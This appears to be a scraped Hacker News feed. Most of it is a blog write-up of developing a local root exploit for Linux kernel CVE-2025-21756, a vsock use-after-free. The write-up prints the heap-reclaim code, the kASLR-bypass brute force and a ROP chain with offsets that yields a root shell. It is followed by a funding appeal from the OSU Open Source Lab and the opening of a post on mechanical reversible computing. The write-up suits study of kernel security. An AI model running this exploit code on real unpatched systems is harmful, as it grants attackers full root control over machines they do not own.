		<a data-ctatext="View Bio" data-destinationlink="https://techcrunch.com/author/sarah-perez/" data-event="button" href="https://techcrunch.com/author/sarah-perez/">View Bio <svg style="width: 1em;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="var(--c-svg, currentColor)" d="M16.5 12 9 19.5l-1.05-1.05L14.4 12 7.95 5.55 9 4.5z"></path></svg></a>
	</p>
	
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux Kernel Exploitation: Attack of the Vsock (189 pts)]]></title>
            <link>https://hoefler.dev/articles/vsock.html</link>
            <guid>43849373</guid>
            <pubDate>Wed, 30 Apr 2025 19:03:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://hoefler.dev/articles/vsock.html">https://hoefler.dev/articles/vsock.html</a>, See on <a href="https://news.ycombinator.com/item?id=43849373">Hacker News</a></p>
<div id="readability-page-1" class="page">
       
        
       <h2>CVE-2025-21756: Attack of the Vsock</h2>
       <p><i>What started off as casual scrolling through the <a href="https://google.github.io/security-research/kernelctf/rules.html">KernelCTF</a> submissions quickly spiraled into a weeks-long deep dive into a deceptively simple patch - and my first root shell from a Linux kernel exploit!</i></p>

       <p>While browsing the <a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vS1REdTA29OJftst8xN5B5x8iIUcxuK6bXdzF8G1UXCmRtoNsoQ9MbebdRdFnj6qZ0Yd7LwQfvYC2oF/pubhtml">public spreadsheet</a> of submissions, I saw an interesting entry: exp237. The bug patch seemed incredibly simple, and I was amazed that a researcher was able to leverage the issue for privilege escalation. So I set off on a journey that would lower my GPA and occasionally leave me questioning my sanity: <i>My first linux kernel exploit</i>!</p>

    <h2>Setting up the Environment</h2>
    <p>Before we can start diving into the exploit development, we need to set up a good linux kernel debugging environment. I decided to use <a href="https://www.qemu.org/">QEMU</a> with scripts from <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">midas's</a> awesome writeup with the <a href="https://github.com/destr4ct/gef-kernel">gef-kernel</a> GDB extensions. I chose to start with linux kernel 6.6.75 since it was close to the versions being exploited by the other researchers. I actually completed this entire project within WSL so that I could write the exploit on my Windows school computer!</p> 
    <img src="https://hoefler.dev/articles/img/kern-pwn-dev.png" alt="kernel exploit development environment screenshot">

    <h2>Patch Analysis</h2>
<!-- improve this description -->
<p>As you can see from the <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=fcdd2242c0231032fc84e1404315c245ae56322a">patch</a> below, the fix only involves a few lines of code. From the code and the description, it is shown that a transport reassignment can trigger <code>vsock_remove_sock</code>, which calls <code>vsock_remove_bound</code> which decreases the reference counter on a vsock object incorrectly (if the socket was unbound to begin with). </p>

<p>When an object's reference counter reaches zero in the kernel, that object is freed to its respective memory manager. Ideally after freeing the vsock object, we will be able to trigger some sort of Use After Free (UAF) to gain a better primitive and escalate privileges.</p>
       <pre>            <code>
--- a/net/vmw_vsock/af_vsock.c
+++ b/net/vmw_vsock/af_vsock.c
@@ -337,7 +337,10 @@ EXPORT_SYMBOL_GPL(vsock_find_connected_socket);
 
 void vsock_remove_sock(struct vsock_sock *vsk)
 {
-	vsock_remove_bound(vsk);
+	/* Transport reassignment must not remove the binding. */
+	if (sock_flag(sk_vsock(vsk), SOCK_DEAD))
+		vsock_remove_bound(vsk);
+
 	vsock_remove_connected(vsk);
 }
 EXPORT_SYMBOL_GPL(vsock_remove_sock);
@@ -821,12 +824,13 @@ static void __vsock_release(struct sock *sk, int level)
 	 */
 	lock_sock_nested(sk, level);
 
+	sock_orphan(sk);
+
 	if (vsk-&gt;transport)
 		vsk-&gt;transport-&gt;release(vsk);
 	else if (sock_type_connectible(sk-&gt;sk_type))
 		vsock_remove_sock(vsk);
 
-	sock_orphan(sk);
 	sk-&gt;sk_shutdown = SHUTDOWN_MASK;
 
 	skb_queue_purge(&amp;sk-&gt;sk_receive_queue);
            </code>
       </pre>

    <p>Along with this patch, the maintainers also added a test-case for the bug, which proved useful in starting out the exploit.</p>
    <pre>        <code>
#define MAX_PORT_RETRIES	24	/* net/vmw_vsock/af_vsock.c */
#define VMADDR_CID_NONEXISTING	42

/* Test attempts to trigger a transport release for an unbound socket. This can
 * lead to a reference count mishandling.
 */
static void test_seqpacket_transport_uaf_client(const struct test_opts *opts)
{
	int sockets[MAX_PORT_RETRIES];
	struct sockaddr_vm addr;
	int s, i, alen;

	s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);

	alen = sizeof(addr);
	if (getsockname(s, (struct sockaddr *)&amp;addr, &amp;alen)) {
		perror("getsockname");
		exit(EXIT_FAILURE);
	}

	for (i = 0; i &lt; MAX_PORT_RETRIES; ++i)
		sockets[i] = vsock_bind(VMADDR_CID_ANY, ++addr.svm_port,
					SOCK_SEQPACKET);

	close(s);
	s = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	if (s &lt; 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	if (!connect(s, (struct sockaddr *)&amp;addr, alen)) {
		fprintf(stderr, "Unexpected connect() #1 success\n");
		exit(EXIT_FAILURE);
	}
	/* connect() #1 failed: transport set, sk in unbound list. */

	addr.svm_cid = VMADDR_CID_NONEXISTING;
	if (!connect(s, (struct sockaddr *)&amp;addr, alen)) {
		fprintf(stderr, "Unexpected connect() #2 success\n");
		exit(EXIT_FAILURE);
	}
	/* connect() #2 failed: transport unset, sk ref dropped? */

	addr.svm_cid = VMADDR_CID_LOCAL;
	addr.svm_port = VMADDR_PORT_ANY;

	/* Vulnerable system may crash now. */
	bind(s, (struct sockaddr *)&amp;addr, alen);

	close(s);
	while (i--)
		close(sockets[i]);

	control_writeln("DONE");
}
        </code>
    </pre>

    <h2>Initial Ideas</h2>

    <p>With this being a UAF bug, I initially had the idea of attempting a <a href="https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf">cross-cache attack</a>. My broad plan was as follows...</p>
    <ol>
        <li>Trigger the arbitrary free of a vsock object</li>
        <li>Reclaim the page with some user controlled object like <code>msg_msg</code></li>
        <li>Corrupt some function pointer in the vsock object to gain code execution</li>
    </ol>

<!--     <p>With these ideas in mind, I was able to spray <code>msg_msg</code> objects to reclaim the freed vsock object.</p> -->

    <h2>Weâ€™ve Got a Panic!</h2>

    <p>Slightly modifying and running the test code on my VM (see <a href="https://hoefler.dev/articles/attachments/crash.c">crash.c</a>) actually leads to the kernel panic seen below! Through some debugging, we find that the vsock object is actually still linked into the <code>vsock_bind_table</code> despite being freed. Great!</p>

    <!-- <pre><code>
[    6.510796] BUG: kernel NULL pointer dereference, address: 0000000000000000
[    6.511577] #PF: supervisor read access in kernel mode
[    6.512468] #PF: error_code(0x0000) - not-present page
[    6.513228] PGD 80000000068f3067 P4D 80000000068f3067 PUD 68f2067 PMD 0
[    6.514703] Oops: 0000 [#1] PREEMPT SMP PTI
[    6.515144] CPU: 0 PID: 111 Comm: x Tainted: G        W          6.6.75 #2
[    6.515461] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    6.516113] RIP: 0010:aa_sk_perm+0x6b/0x220
[    6.516466] Code: f6 43 41 08 0f 85 97 00 00 00 49 8b 95 80 02 00 00 48 8b 35 67 1c 29 03 65 48 8b 0c 25 00 24 03 00 48 85 db 41 0f 95 c6 31 c0 <48> 39 32 74 1e f6 434
[    6.518694] RSP: 0018:ffffc9000062fd38 EFLAGS: 00000246
[    6.519368] RAX: 0000000000000000 RBX: ffff88800528c1a8 RCX: ffff8880064bbf00
[    6.519683] RDX: 0000000000000000 RSI: ffff88800528d5a8 RDI: ffffffff832d94eb
[    6.520118] RBP: ffffffff832d94eb R08: ffffc9000062fda8 R09: 0000000000000000
[    6.520458] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000200000
[    6.521168] R13: ffff8880068fc500 R14: 0000000000000001 R15: 0000000000000000
[    6.522032] FS:  000000003eb18380(0000) GS:ffff888007a00000(0000) knlGS:0000000000000000
[    6.522565] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    6.523028] CR2: 0000000000000000 CR3: 00000000068f0000 CR4: 00000000000006f0
[    6.523366] Call Trace:
[    6.523691]  <TASK>
[    6.523875]  ? __die+0x1f/0x70
[    6.524088]  ? page_fault_oops+0x17d/0x4c0
[    6.524377]  ? search_module_extables+0x4a/0x80
[    6.524794]  ? aa_sk_perm+0x6b/0x220
[    6.525005]  ? search_bpf_extables+0x5b/0x80
[    6.525357]  ? exc_page_fault+0x7d/0x170
[    6.525596]  ? asm_exc_page_fault+0x22/0x30
[    6.525866]  ? aa_sk_perm+0x6b/0x220
[    6.526099]  security_socket_bind+0x3a/0x60
[    6.526532]  __sys_bind+0xca/0xf0
[    6.526696]  ? __rseq_handle_notify_resume+0x34a/0x510
[    6.527071]  __x64_sys_bind+0x14/0x20
[    6.527262]  do_syscall_64+0x5d/0x90
[    6.527569]  ? syscall_exit_to_user_mode+0x27/0x40
[    6.528178]  ? __x64_sys_connect+0x14/0x20
[    6.528436]  ? do_syscall_64+0x69/0x90
[    6.528779]  ? __rseq_handle_notify_resume+0x34a/0x510
[    6.529442]  ? __pfx_read_tsc+0x10/0x10
[    6.529741]  ? task_mm_cid_work+0x18d/0x1f0
[    6.530005]  ? switch_fpu_return+0x17/0xe0
[    6.530265]  ? exit_to_user_mode_prepare+0x137/0x150
[    6.530892]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
[    6.531221] RIP: 0033:0x433737
[    6.531610] Code: 49 0f bc c4 c1 e0 1a 0d 00 00 04 00 89 01 e9 e0 fe ff ff e8 4b 01 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 b8 31 00 00 00 0f 05 <48> 3d 01 f0 ff ff 738
[    6.532627] RSP: 002b:00007fff7fb8c9c8 EFLAGS: 00000206 ORIG_RAX: 0000000000000031
[    6.533179] RAX: ffffffffffffffda RBX: 00007fff7fb8cc38 RCX: 0000000000433737
[    6.533610] RDX: 0000000000000010 RSI: 00007fff7fb8c9e0 RDI: 0000000000000003
[    6.534433] RBP: 00007fff7fb8ca60 R08: 0000000000000000 R09: 000000003eb196a0
[    6.535428] R10: 0000000000001000 R11: 0000000000000206 R12: 0000000000000001
[    6.536232] R13: 00007fff7fb8cc28 R14: 0000000000000001 R15: 0000000000000001
[    6.536633]  </TASK>
    </code></pre> -->

    <img src="https://hoefler.dev/articles/img/panic.png">

    <p>The panic occurs when AppArmor dereferences a NULL sk_security pointer during a bind() call on the recycled socket. This confirms the UAF and highlights the obstacle posed by LSM hooks (see below).</p>

    <h2>Roadblock #1: AppArmor + LSM</h2>
    <img src="https://hoefler.dev/articles/img/lotsofarmor.jpg" alt="AppArmor">
    <p>The first major roadblock we hit is apparmor. This is the seen in the above callstack where the kernel invokes <code>security_socket_bind</code> and <code>aa_sk_perm</code>. The <code>security_socket_*</code> functions are Linux Security Module (LSM) hooks which call into AppArmor. So how is our socket failing for AppArmor security check?</p>
    <p>Investigating the problem, it is apparent that <code>__sk_destruct</code> calls <code>sk_prot_free</code> which calls <code>security_sk_free</code>. So when we trigger our bug to decrement the refcnt and the vsock is freed, the <code>sk-&gt;sk_security</code> pointer will be zeroed out.</p>
    <pre><code>

/**
 * security_sk_free() - Free the sock's LSM blob
 * @sk: sock
 *
 * Deallocate security structure.
 */
void security_sk_free(struct sock *sk)
{
	call_void_hook(sk_free_security, sk);
	kfree(sk-&gt;sk_security);
	sk-&gt;sk_security = NULL;
}
    </code></pre>
    <p>But when we call <code>security_socket_bind</code>, the AppArmor function dereferences this <code>sk-&gt;sk_security</code> struct. Worse yet, it seems like almost every socket function has an LSM counterpart. In short: the kernel grants us a dangling pointer to the socket â€” but AppArmor ensures we crash before we can do anything useful with it. So how can we UAF if we can't even call any useful functions with our recycled socket?</p>
    <!-- <img src="img/lotsofarmor.jpg" style="width: 20pc"> -->
    <pre><code>
gef&gt; p security_socket_*
security_socket_accept             security_socket_getpeername        
security_socket_bind               security_socket_getpeersec_dgram   
security_socket_connect            security_socket_getpeersec_stream  
security_socket_create             security_socket_getsockname        
security_socket_getsockopt         security_socket_sendmsg
security_socket_listen             security_socket_setsockopt
security_socket_post_create        security_socket_shutdown
security_socket_recvmsg            security_socket_socketpair
</code></pre>

<p>We have two main options.</p>
<ol>
<li>Forge an sk_security pointer to a fake object</li>
<li>Find some functions which aren't protected by apparmor</li>
</ol>
<p>I decided to explore option #2 first.</p>

<!-- <pre><code>
static inline struct aa_sk_ctx *aa_sock(const struct sock *sk)
{
	return sk->sk_security + apparmor_blob_sizes.lbs_sock;
}

static int aa_label_sk_perm(const struct cred *subj_cred,
			    struct aa_label *label,
			    const char *op, u32 request,
			    struct sock *sk)
{
	struct aa_sk_ctx *ctx = aa_sock(sk);
	int error = 0;

	AA_BUG(!label);
	AA_BUG(!sk);

	if (ctx->label != kernel_t && !unconfined(label)) {
		struct aa_profile *profile;
		DEFINE_AUDIT_SK(ad, op, sk);

		ad.subj_cred = subj_cred;
		error = fn_for_each_confined(label, profile,
			    aa_profile_af_sk_perm(profile, &ad, request, sk));
	}

	return error;
}
</code></pre> -->

    <h2>Chinks in the (App)Armor &amp; Defeating kASLR</h2>
    <img src="https://hoefler.dev/articles/img/broken.jpg" alt="">
    <p>My first focus was to find a way to leak some addresses. Some "obvious" choices would be functions like <code>getsockopt</code> or <code>getsockname</code> but these functions are all protected by apparmor. Browsing through source code, I stumbled upon the <code>vsock_diag_dump</code> feature. This was a super interesting function, as it isn't protected by apparmor. The code is listed below.</p>
    <pre><code>
static int vsock_diag_dump(struct sk_buff *skb, struct netlink_callback *cb)
{
	
	// ... snip ...

	/* Bind table (locally created sockets) */
	if (table == 0) {
		while (bucket &lt; ARRAY_SIZE(vsock_bind_table)) {
			struct list_head *head = &amp;vsock_bind_table[bucket];

			i = 0;
			list_for_each_entry(vsk, head, bound_table) {
				struct sock *sk = sk_vsock(vsk);

				if (!net_eq(sock_net(sk), net))
					continue;
				if (i &lt; last_i)
					goto next_bind;
				if (!(req-&gt;vdiag_states &amp; (1 &lt;&lt; sk-&gt;sk_state)))
					goto next_bind;
				if (sk_diag_fill(sk, skb,
						 NETLINK_CB(cb-&gt;skb).portid,
						 cb-&gt;nlh-&gt;nlmsg_seq,
						 NLM_F_MULTI) &lt; 0)
					goto done;
next_bind:
				i++;
			}
			last_i = 0;
			bucket++;
		}

		table++;
		bucket = 0;
	}

	// ... snip ...

}
    </code></pre>
    <p>Since our freed socket is still in the bind table, there are only two checks keeping us from dumping some information from the socket. The <code>sk-&gt;sk_state</code> check is easy to pass (not requiring any leaks), but the <code>sk_net</code> check seems tougher. How can we forge a <code>sk-&gt;__sk_common-&gt;skc_net</code> pointer without having a kASLR leak yet? This is where I was stuck for around a week, but was able to overcome this difficulty thanks to help from the community on discord!</p>
    <h2>Diag Dump Sidechannel For Fun &amp; Profit</h2>

    <p>Stuck in my tracks, I resorted to the kernelctf community, sharing the above checks on the discord. Almost immediately, @h0mbre responded with the idea of brute forcing the <code>skc_net</code> pointer, essentially using <code>vsock_diag_dump</code> as a side channel! Brilliant ðŸ¤¯!</p>

    <img src="https://hoefler.dev/articles/img/h0mbre.png" alt="">

    <p>So in summary, we do the following to leak <code>init_net</code>...</p>

    <ol>
    <li><p>Spray pipes to reclaim the UAF'd socket's page</p></li>

    <li><p>Fill each pipe buffer QWORD-by-QWORD with controlled values</p></li>

    <li><p>Use vsock_diag_dump() as a side channel to detect if our overwritten struct is â€œvalid enoughâ€ to bypass filtering</p></li>

    <li><p>Once vsock_diag_dump() stops reporting our socket, we know we corrupted skc_net</p></li>

    <li><p>We then brute force the lower bits of init_net until the socket is accepted againâ€”giving us a full kASLR bypass</p></li></ol>
    
    <p>The suggestion to use pipe backing pages by @h0mbre turned out to be way more stable/usable than the <code>msg_msg</code> objects I was using before. With a little bit of work, I was able to get the following code to sucessfully leak the <code>sk_net</code> pointer.</p>
    <pre><code>
int junk[FLUSH];
for (int i = 0; i &lt; FLUSH; i++)
    junk[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

puts("[+] pre alloc sockets");
int pre[PRE];
for (int i = 0; i &lt; PRE; i++)
    pre[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

// ... snip ... (alloc target &amp; trigger uaf)

puts("[+] fill up the cpu partial list");
for (int i = 4; i &lt; FLUSH; i += OBJS_PER_SLAB)
    close(junk[i]);

puts("[+] free all the pre/post alloc-ed objects");
for (int i = 0; i &lt; POST; i++)
    close(post[i]);
for (int i = 0; i &lt; PRE; i++)
    close(pre[i]);
    </code></pre>
    <p>The pre &amp; post allocation of objects ensures that the entire page is actually returned to the buddy allocater (see <a href="https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/">this</a> writeup). Below is the code to actually find the <code>skc_net</code> pointer.</p>
    <pre><code>
int pipes[NUM_PIPES][2];
char page[PAGE_SIZE];
memset(page, 2, PAGE_SIZE); // skc_state must be 2

puts("[+] reclaim page");

int w = 0;
int j;
i = 0;
while (i &lt; NUM_PIPES) {

    sleep(0.1);

    if (pipe(&amp;pipes[i][0]) &lt; 0) {
        perror("pipe");
        break;
    }

    printf(".");
    fflush(stdout);


    w = 0;
    while (w &lt; PAGE_SIZE) {
        ssize_t written = write(pipes[i][1], page, 8);
        j = query_vsock_diag();
        w += written;
        if (j != 48) goto out;
    }
    i++;
    if (i % 32 == 0) puts("");
}
    </code></pre>
    <p>As you can see, this code just keeps creating new pipes and populating them one QWORD at a time (0x0202020202020202 to satisfy <code>skc_state</code>), until <code>vsock_diag_dump</code> doesn't find the victim socket anymore. This means that we have overwritten <code>skc_net</code>. Once we actually overwrite the pointer, we just need to brute force the lower 32-bits of the address in the same fasion.</p>
    <pre><code>
long base = 0xffffffff84bb0000; // determined through experimentation
long off = 0;
long addy;
printf("[+] attempting net overwrite (aslr bypass).\n");

while (off &lt; 0xffffffff) {


    close(pipes[i][0]);
    close(pipes[i][1]);

    if (pipe(&amp;pipes[i][0]) &lt; 0) {
        perror("pipe");
    }

    addy = base + off;

    write(pipes[i][1], page, w - 8);
    write(pipes[i][1], &amp;addy, 8);

    if (off % 256 == 0) {
        printf("+");
        fflush(stdout);
    }

    j = query_vsock_diag();
    if (j == 48) {
        printf("\n[*] LEAK init_net @ 0x%lx\n", base + off);
        goto out2;
    }

    off += 128;

}
    </code></pre>

    <p>With the <code>skc_net</code> overwrite, we have killed two birds with one stone. We defeat kASLR and land at a known offset in our vsock object.</p>
        <img src="https://hoefler.dev/articles/img/twobirds.jpg">
	<p>Now all that is left is to find a reliable way to redirect execution flow...</p>  
    <h2>Controlling RIP</h2>
    <p>To control the instruction pointer, I resorted to the <code>vsock_release</code> function, since it is one of the few vsock functionalities not protected by apparmor.</p>
    <pre><code>
static int vsock_release(struct socket *sock)
{
	struct sock *sk = sock-&gt;sk;

	if (!sk)
		return 0;

	sk-&gt;sk_prot-&gt;close(sk, 0);
	__vsock_release(sk, 0);
	sock-&gt;sk = NULL;
	sock-&gt;state = SS_FREE;

	return 0;
}
    </code></pre>
    <p>We are most interested in the call to <code>sk-&gt;sk_prot-&gt;close(sk, 0)</code>. Since we control sk, we need a valid <i>pointer to a pointer to a function</i>. This had me stumped for a while, until I started thinking about using the other valid proto objects. I found that <code>raw_proto</code> had a pointer to an abort function shown below.</p>
    <pre><code>
int raw_abort(struct sock *sk, int err)
{
	lock_sock(sk);

	sk-&gt;sk_err = err;
	sk_error_report(sk);
	__udp_disconnect(sk, 0);

	release_sock(sk);

	return 0;
}
    </code></pre>
    <p>This function calls into <code>sk_error_report</code>, which is shown below.</p>
    <pre><code>
void sk_error_report(struct sock *sk)
{
	sk-&gt;sk_error_report(sk);

	switch (sk-&gt;sk_family) {
	case AF_INET:
		fallthrough;
	case AF_INET6:
		trace_inet_sk_error_report(sk);
		break;
	default:
		break;
	}
}
    </code></pre>
    <p>So if we can overwrite the <code>sk-&gt;sk_error_report</code> field of our socket with a stack pivot gadget, we should be able to jump to a ROP chain starting at the base of the socket.</p>
<img src="https://hoefler.dev/articles/img/ropping.jpg" alt="">
<p>A nice visualization of the state of the vsock after the overwrite is below.</p>
    <pre>sk-&gt;sk_prot --&gt; &amp;raw_proto
              â†³ .close = raw_abort
                          â†³ sk-&gt;sk_error_report(sk) â†’ *stack pivot*
</pre>
        
    <p>Another important mention is that it became necessary to forge the <code>sk_lock</code> member with some null bytes and pointers (determined through lots of debugging). With all of this figured out, I constructed the following ROP chain.</p>
    <pre><code>
long kern_base = base + off - 0x3bb1f80;
printf("[*] leaked kernel base @ 0x%lx\n", kern_base);

// calculate some rop gadgets
long raw_proto_abort = kern_base + 0x2efa8c0;
long null_ptr = kern_base + 0x2eeaee0;
long init_cred = kern_base + 0x2c74d80;
long pop_r15_ret = kern_base + 0x15e93f;
long push_rbx_pop_rsp_ret = kern_base + 0x6b9529;
long pop_rdi_ret = kern_base + 0x15e940;
long commit_creds = kern_base + 0x1fcc40;
long ret = kern_base + 0x5d2;

// info for returning to usermode
long user_cs = 0x33;
long user_ss = 0x2b;
long user_rflags = 0x202;
long shell = (long)get_shell;

uint64_t* user_rsp = (uint64_t*)get_user_rsp();

// return to user mode
long swapgs_restore_regs_and_return_to_usermode = kern_base + 0x16011a6;

//getchar();

printf("[+] writing the rop chain\n");

close(pipes[i][0]);
close(pipes[i][1]);

if (pipe(&amp;pipes[i][0]) &lt; 0) {
    perror("pipe");
}

printf("[+] writing payload to vsk\n");
write(pipes[i][1], page, w - 56);

char buf[0x330];
memset(buf, 'A', 0x330);
char not[0x330];
memset(not, 0, 0x330);

// create the rop chain!
write(pipes[i][1], &amp;pop_rdi_ret, 8); // stack pivot target
write(pipes[i][1], &amp;init_cred, 8);
write(pipes[i][1], &amp;ret, 8); 
write(pipes[i][1], &amp;ret, 8);
write(pipes[i][1], &amp;pop_r15_ret, 8); // junk
write(pipes[i][1], &amp;raw_proto_abort, 8); // sk_prot (calls sk-&gt;sk_error_report())
write(pipes[i][1], &amp;ret, 8);
write(pipes[i][1], &amp;commit_creds, 8); // commit_creds(init_cred);
write(pipes[i][1], &amp;swapgs_restore_regs_and_return_to_usermode, 8);
write(pipes[i][1], &amp;null_ptr, 8); // rax
write(pipes[i][1], &amp;null_ptr, 8); // rdi
write(pipes[i][1], &amp;shell, 8); // rip
write(pipes[i][1], &amp;user_cs, 8);
write(pipes[i][1], &amp;user_rflags, 8);
write(pipes[i][1], user_rsp, 8); // rsp
write(pipes[i][1], &amp;user_ss, 8);
write(pipes[i][1], buf, 0x18);
write(pipes[i][1], &amp;\not, 8); // sk_lock
write(pipes[i][1], &amp;\not, 8); // sk_lock
write(pipes[i][1], &amp;null_ptr, 8); // sk_lock
write(pipes[i][1], &amp;null_ptr, 8); // sk_lock
write(pipes[i][1], buf, 0x200);
write(pipes[i][1], &amp;push_rbx_pop_rsp_ret, 8); // stack pivot [sk_error_report()]

//getchar();

close(s); // trigger the exploit!
    </code></pre>
    <p>Notice that I did not call <code>prepare_kernel_cred(NULL)</code> since this is no longer supported (causes a crash). Instead I opted to call <code>commit_creds</code> with <code>init_cred</code> - a structure with a constant offset from the kernel base possessing uid=gid=0. I also borrowed the swapgs_restore_regs_and_return_to_usermode technique from <a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">this</a> blog. With all of those puzzle pieces in place, our exploit gives a root shell!</p>
    <img src="https://hoefler.dev/articles/img/pwned.png" alt="">
    <p>The final source code for the exploit is posted <a href="https://github.com/hoefler02/CVE-2025-21756/blob/main/x.c">here</a>. The exploit could still be much more reliable and elegant, but for my first kernel pwn I am happy with it!</p>
    <h2>Thank You!</h2>
    <p>For a bug involving just a few lines of patch code, this journey taught me way more about the kernel than I ever could have expected! I could never have completed this exploit without all of the super helpful hackers on the #kernelctf discord channel! Thank you all + happy pwning!</p>
    

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Future of OSU Open Source Lab in Jeopardy (219 pts)]]></title>
            <link>https://osuosl.org/blog/osl-future/</link>
            <guid>43849271</guid>
            <pubDate>Wed, 30 Apr 2025 18:51:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://osuosl.org/blog/osl-future/">https://osuosl.org/blog/osl-future/</a>, See on <a href="https://news.ycombinator.com/item?id=43849271">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>I am writing to inform you about a critical and time-sensitive situation facing the Open Source Lab. Over the past
several years, we have been operating at a deficit due to a decline in corporate donations. While the Oregon State
College of Engineering (CoE) has generously filled this gap, recent changes in university funding makes our current
funding model no longer sustainable. As a result, our current funding model is no longer sustainable and CoE needs to
find ways to cut programs.</p><p>Earlier this week, I was informed that unless we secure $250,000 in committed funds, the OSL will be forced to shut
down later this year. I have reached out to our largest corporate sponsor and they are working to increase their
support as we update our contract, but that still may not be enough.</p><p>For transparency, the $250,000 is broken down into the following roughly:</p><ul><li>Staff pay $150k (60%) (1 staff)</li><li>Student pay $65k (26%) (8 students)</li><li>Other expenses $35k (14%)</li></ul><p>Other expenses include items such as hardware, travel, subscription services and other miscellaneous expenses needed to
run the OSL day to day.</p><p>If any of you can assist or connect me with potential supporters, please reach out as soon as possible. I need to
provide leadership with an update on any funding changes by <strong>Wednesday, May 14, 2025</strong>. Please reach out directly via
<em><strong><a href="mailto:donations@osuosl.org">donations@osuosl.org</a></strong></em> if youâ€™re able to help us make it through this difficult time.</p><p>The OSU Foundation is an IRS 501(c)(3) nonprofit corporation, which provides many donors a tax advantage. Please
contact the OSU Foundation directly if you have questions about your eligibility. You can donate directly to us by
visiting our <a href="https://osuosl.org/donate">donation page</a>.</p><p>OSL provides hosting for over 500 Free and Open Source Projects from all over the world. Over the course of its 22-year
existence, the OSL has mentored over 130 students, many of whom have gone on to create their own companies and work
throughout the larger tech ecosystem.</p><p>Some notable milestones over the years include:</p><ul><li>Provided hosting for Mozilla Firefox when they needed help in the early days and hosted the release of 1.0</li><li>Was the home of the Apache Software Foundation, Linux Foundation, Kernel.org, Mozilla for many years</li><li>Offers fast and reliable software mirroring for projects</li><li>Currently provides infrastructure hosting for projects such as Drupal, Gentoo Linux, Debian, Fedora, phpBB, OpenID,
Buildroot/Busybox, Inkscape, Cinc and many more!</li><li>Virtual machines for x86, aarch64 and ppc64le are used by many projects for CI and other hosted services</li></ul><p>Additionally, the university has long-term plans to deprecate the data center where all of our hosting is currently
located. Much of the university hosting has been moved to the cloud or the state data center, and OSU lacks the funds
to replace the aging UPS/HVAC systems. I am actively seeking a new location to host our systems, but finding suitable
data center space on campus has proven to be extremely challenging.</p><p>To be clear: OSLâ€™s immediate need is securing additional funding, the data center situation can be worked on later.
Your commitment is crucial for us to move forward. I am available to answer any questions you might have.</p><p>Thank you for your continued support!</p><p>Lance Albertson, Director</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reversible computing with mechanical links and pivots (137 pts)]]></title>
            <link>https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/index.html</link>
            <guid>43848398</guid>
            <pubDate>Wed, 30 Apr 2025 17:35:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/index.html">https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=43848398">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">




<div id="outline-container-org1dc929b">
<h2 id="org1dc929b">Intro</h2>
<div id="text-org1dc929b">
<p>
With the concern that â€œMooreâ€™s Law is dead,â€ new interest has grown for unconventional forms of computing. This includes:
</p>

<ul>
<li><a href="https://en.wikipedia.org/wiki/Quantum_computing">quantum computing</a> (for atomic simulations and specific NP approximation algorithms)</li>
<li><a href="https://en.wikipedia.org/wiki/Analog_computer">analog computing</a> (for fast-and-efficient-but-error-prone computation, such as neural net inference)</li>
<li><a href="https://en.wikipedia.org/wiki/Reversible_computing">reversible computing</a> (for maximum energy efficiency)</li>
</ul>

<p>
It is believed that the most efficient computing devices would use little or no entropy during reversible computations, and only consume energy during non-reversible parts of computation. Specifically, the <a href="https://en.wikipedia.org/wiki/Landauer%27s_principle">Landauerâ€™s principle</a> states that all non-physically-reversible computation operations consume at least \(2.9 \times 10^{-21}\) J of energy at room temperature (and less as the temperature drops).
</p>

<p>
Are we at the theoretical maximum efficiency yet? No. Using some back-of-the-napkin math:
</p>

<ul>
<li>AMD Ryzen Threadripper 7995WX has about 12 TFLOPS of FP32 (single-precision) compute (<a href="https://wccftech.com/amd-ryzen-threadripper-7995wx-cpu-more-fp32-tflops-than-xbox-series-x-ps5-on-par-rtx-3060-gpu/">link</a>)</li>
<li>Assuming 30 irreversible computations per FP32 operation (from Claude), we have 10<sup>14.5</sup> irreversible computations per second</li>
<li>At 350 W this is about \(10^{-12}\) J per irreversible computation, or about <i>9 orders of magnitude</i> less efficient than the theoretical maximum</li>
</ul>

<p>
Even if a CPU like the AMD Ryzen Z1 Extreme or Apple M4 can improve this efficiency by a factor of 10 (which is too generous), weâ€™re still a long way out from hitting the theoretical wall.
</p>

<p>
Nevertheless, it is both fun and prudent to imagine how different paradigms of computing would work. These different paradigms might even be competitive in certain niches long before transistors hit a wall. My favorite reversible computing scheme comes from a paper named <a href="https://doi.org/10.48550/arXiv.1801.03534">Mechanical Computing Systems Using Only Links and Rotary Joint</a>. In it, they use <i>links</i> and <i>rotary joints</i> (hinges) to build Turing-complete computing machines.
</p>
</div>
</div>
<div id="outline-container-orged82550">
<h2 id="orged82550">The â€œLockâ€</h2>
<div id="text-orged82550">
<p>
